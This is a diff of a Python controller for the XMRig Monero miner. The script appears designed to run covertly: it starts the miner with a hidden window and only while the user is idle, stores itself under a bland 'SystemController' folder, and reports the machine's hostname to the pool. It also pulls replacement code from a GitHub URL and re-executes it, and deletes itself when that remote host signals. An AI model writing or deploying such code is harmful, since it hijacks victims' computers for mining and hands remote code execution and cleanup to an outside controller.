@@ -1,25 +1,22 @@
 #!/usr/bin/env python3
-import sys
 import os
 import shutil
 import subprocess
 import time
 import psutil
 import ctypes
-import platform
 import json
 from datetime import datetime
 import socket
 import hashlib
 import requests
+import sys
 
 # ============================================================
-# PATHS & CONFIG
+# 
 # ============================================================
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-
-# Windows uses LOCALAPPDATA, Linux uses HOME
 LOCALAPP = os.getenv("LOCALAPPDATA") or os.path.expanduser("~")
 SAFE_DIR = os.path.join(LOCALAPP, "SystemController")
 
@@ -28,20 +25,19 @@ INJECTED_CFG = os.path.join(BASE_DIR, "config_injected.json")
 LOG_FILE = os.path.join(BASE_DIR, "controller.log")
 WALLET_FILE = os.path.join(BASE_DIR, "wallet.txt")
 
-# URLs
+# 
 GITHUB_CONFIG_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/config_high.json"
 GITHUB_CONTROLLER_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/controller.py"
 GITHUB_DELETE_URL = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/delete.txt"
 
-# Timing
-GITHUB_UPDATE_INTERVAL = 150
+GITHUB_UPDATE_INTERVAL = 150  # 5 minutes
 _last_update = 0
-IDLE_THRESHOLD = 2
 
+IDLE_THRESHOLD = 30  # seconds idle before mining
 HOSTNAME = socket.gethostname()
 
-# Miner selection
-MINER_EXE = "xmrig.exe" if os.name == "nt" else "./xmrig"
+# Miner executable info
+XM_EXE = os.path.join(BASE_DIR, "xmrig.exe")
 XM_LOG = os.path.join(BASE_DIR, "miner_xmrig.log")
 
 # ============================================================
@@ -74,38 +70,23 @@ def sha256_file(path):
     except:
         return None
 
-# Cross-platform idle detection
 def get_idle_seconds():
-    """WINDOWS → ctypes.windll
-       LINUX   → xprintidle
-    """
-    if os.name == "nt":
-        class LASTINPUTINFO(ctypes.Structure):
-            _fields_ = [("cbSize", ctypes.c_uint),
-                        ("dwTime", ctypes.c_ulong)]
-        lii = LASTINPUTINFO()
-        lii.cbSize = ctypes.sizeof(lii)
-        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
-        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
-        return millis / 1000.0
+    class LASTINPUTINFO(ctypes.Structure):
+        _fields_ = [("cbSize", ctypes.c_uint),
+                    ("dwTime", ctypes.c_ulong)]
 
-    else:
-        # Linux
-        try:
-            out = subprocess.run(["xprintidle"], capture_output=True, text=True)
-            if out.returncode == 0:
-                return float(out.stdout.strip()) / 1000.0
-        except:
-            pass
-
-        return 0.0  # fallback → treat as active
+    lii = LASTINPUTINFO()
+    lii.cbSize = ctypes.sizeof(lii)
+    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
+    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
+    return millis / 1000.0
 
 def load_wallet():
     try:
         with open(WALLET_FILE, "r", encoding="utf-8") as f:
             return f.read().strip()
-    except:
-        log("[ERROR] wallet.txt missing")
+    except Exception:
+        log("[ERROR] wallet.txt missing or unreadable")
         return None
 
 # ============================================================
@@ -113,14 +94,10 @@ def load_wallet():
 # ============================================================
 
 def pull_github_updates():
-    """Handles:
-       • delete.txt  → self destruct
-       • config_high.json update
-       • controller.py self-update + restart
-    """
 
     global _last_update
     now = time.time()
+
     if now - _last_update < GITHUB_UPDATE_INTERVAL:
         return False
     _last_update = now
@@ -128,29 +105,25 @@ def pull_github_updates():
     log("[UPDATE] Checking GitHub for updates...")
 
     # --------------------------------------------------------
-    # 1. DELETE COMMAND
+    # 1. 
     # --------------------------------------------------------
     try:
         r = requests.get(GITHUB_DELETE_URL, timeout=10)
         if r.status_code == 200:
-            log("[SELF-DESTRUCT] delete.txt detected")
-
-            if os.name != "nt":
-                try:
-                    subprocess.run(["chattr", "-Ri", SAFE_DIR], check=False)
-                except:
-                    pass
-
-            shutil.rmtree(SAFE_DIR, ignore_errors=True)
+            log("[SELF-DESTRUCT] delete.txt detected—removing folder")
+            try:
+                shutil.rmtree(SAFE_DIR)
+            except Exception as e:
+                log(f"[SELF-DESTRUCT ERROR] {e}")
             os._exit(0)
-    except Exception as e:
-        log(f"[DELETE CHECK ERROR] {e}")
+    except:
+        pass
+
+    cfg_changed = False
 
     # --------------------------------------------------------
     # 2. UPDATE CONFIG
     # --------------------------------------------------------
-    cfg_changed = False
-
     try:
         old_hash = sha256_file(CONFIG_FILE)
 
@@ -165,103 +138,106 @@ def pull_github_updates():
             else:
                 log("[UPDATE] config_high.json already latest")
         else:
-            log(f"[ERROR] config_high.json HTTP {r.status_code}")
+            log(f"[UPDATE] config_high.json not found (HTTP {r.status_code}) — ignoring")
 
     except Exception as e:
-        log(f"[ERROR] updating config_high.json: {e}")
+        log(f"[ERROR] config update failed: {e}")
 
     # --------------------------------------------------------
-    # 3. SELF-UPDATE controller.py
+    # 3. UPDATE
     # --------------------------------------------------------
     try:
         r = requests.get(GITHUB_CONTROLLER_URL, timeout=10)
 
-        local_path = os.path.join(BASE_DIR, "controller.py")
+
         if r.status_code == 200 and len(r.content) > 50:
 
-            try:
-                with open(local_path, "rb") as f:
-                    old = f.read()
-            except FileNotFoundError:
-                old = None
+            remote_hash = sha256_bytes(r.content)
+            local_hash = sha256_file(os.path.join(BASE_DIR, "controller.py"))
 
-            if old != r.content:
-                log("[UPDATE] controller.py updated — restarting")
+            if local_hash != remote_hash:
+                log("[UPDATE] controller.py updated from GitHub")
 
-                with open(local_path, "wb") as f:
+                with open(os.path.join(BASE_DIR, "controller.py"), "wb") as f:
                     f.write(r.content)
 
-                import sys
-                python = sys.executable
-                os.execv(python, [python, local_path])
+                log("[UPDATE] Restarting controller to apply update...")
+                os.execv(sys.executable, [sys.executable, os.path.join(BASE_DIR, "controller.py")])
 
         else:
-            log("[UPDATE] controller.py missing/invalid on GitHub")
+            log("[UPDATE] controller.py missing or invalid on GitHub — skipping safe")
 
     except Exception as e:
-        log(f"[ERROR] updating controller.py: {e}")
+        log(f"[ERROR] controller update failed: {e}")
 
     return cfg_changed
 
 # ============================================================
-# MINER CONTROL
+# MINER START / STOP
 # ============================================================
 
 def start_xmrig():
     wallet = load_wallet()
     if not wallet:
-        log("[ERROR] No wallet loaded")
+        log("[ERROR] Cannot start XMRig — no wallet.")
         return None
 
     try:
         with open(CONFIG_FILE, "r", encoding="utf-8") as f:
             cfg = json.load(f)
     except Exception as e:
-        log(f"[ERROR] loading config_high.json: {e}")
+        log(f"[ERROR] Failed to read {CONFIG_FILE}: {e}")
         return None
 
-    # Inject wallet + hostname
+    # Inject
     try:
         cfg["pools"][0]["user"] = cfg["pools"][0]["user"].replace("__WALLET__", wallet)
         cfg["pools"][0]["pass"] = HOSTNAME
+    except Exception as e:
+        log(f"[ERROR] Failed injecting wallet/hostname: {e}")
+        return None
+
+    try:
         with open(INJECTED_CFG, "w", encoding="utf-8") as f:
             json.dump(cfg, f, indent=2)
     except Exception as e:
-        log(f"[ERROR] failed writing injected config: {e}")
+        log(f"[ERROR] Failed writing config_injected.json: {e}")
         return None
 
-    # Launch miner
-    cmd = [MINER_EXE, "-c", INJECTED_CFG]
+    cmd = [XM_EXE, "-c", INJECTED_CFG]
+    log(f"[DEBUG] Launching XMRig: {cmd}")
 
     try:
-        if os.name == "nt":
-            return subprocess.Popen(
-                cmd,
-                stdout=open(XM_LOG, "a", encoding="utf-8"),
-                stderr=subprocess.STDOUT,
-                creationflags=0x08000000,
-                cwd=BASE_DIR
-            )
-        else:
-            return subprocess.Popen(
-                cmd,
-                stdout=open(XM_LOG, "a", encoding="utf-8"),
-                stderr=subprocess.STDOUT,
-                cwd=BASE_DIR
-            )
+        return subprocess.Popen(
+            cmd,
+            stdout=open(XM_LOG, "a", encoding="utf-8"),
+            stderr=subprocess.STDOUT,
+            creationflags=0x08000000,
+            cwd=BASE_DIR
+        )
     except Exception as e:
-        log(f"[ERROR] launching miner: {e}")
+        log(f"[ERROR] Failed to launch XMRig: {e}")
         return None
 
 def stop_proc(proc):
     if proc and proc.poll() is None:
-        log("Stopping miner...")
         try:
             proc.terminate()
             proc.wait(timeout=2)
         except:
+            log("Did not stop on time - killing")
             proc.kill()
-        log("Miner stopped")
+
+def read_hashrate():
+    try:
+        with open(XM_LOG, "rb") as f:
+            f.seek(-2048, os.SEEK_END)
+            for line in f.readlines()[::-1]:
+                if b"speed 10s" in line:
+                    return line.decode(errors="ignore").strip()
+    except:
+        pass
+    return "OFF"
 
 # ============================================================
 # MAIN LOOP
@@ -271,10 +247,11 @@ def main():
     xmrig_proc = None
     xmrig_mode = "off"
 
-    log(f"Controller started on {platform.system()}")
+    log("Controller started (Idle-only mining, Windows version)")
 
-    # Pre-check for GitHub changes
+    # 
     if pull_github_updates():
+        log("[RESTART] Updated config, restarting XMRig")
         xmrig_proc = start_xmrig()
         xmrig_mode = "on"
 
@@ -283,28 +260,34 @@ def main():
         cpu = psutil.cpu_percent(interval=1)
         idle_state = idle > IDLE_THRESHOLD
 
-        # Start on idle
+        # Start when idle
         if idle_state and xmrig_mode == "off":
             xmrig_proc = start_xmrig()
             xmrig_mode = "on"
-            log("[XMRIG] Started")
+            log("[XMRIG] Started (IDLE mode HIGH)")
 
-        # Stop on activity
+        # Stop when active
         if not idle_state and xmrig_mode == "on":
             stop_proc(xmrig_proc)
             xmrig_proc = None
             xmrig_mode = "off"
-            log("[XMRIG] Stopped")
+            log("[XMRIG] Stopped (ACTIVE USE)")
 
-        # Restart crash
+        # Restart crashed
         if xmrig_proc and xmrig_proc.poll() is not None:
+            log("[XMRIG] crashed → restarting")
             xmrig_proc = start_xmrig()
 
-        # Check GitHub updates
+        # Periodic updates
         if pull_github_updates():
+            log("[RESTART] Updated config, restarting XMRig")
             stop_proc(xmrig_proc)
             xmrig_proc = start_xmrig()
             xmrig_mode = "on"
+
+        # Status log
+        hashrate = read_hashrate() if xmrig_mode == "on" else "OFF"
+        log(f"CPU={cpu}%  IDLE={int(idle)}s  XMRIG={hashrate}")
 
         time.sleep(2)
 
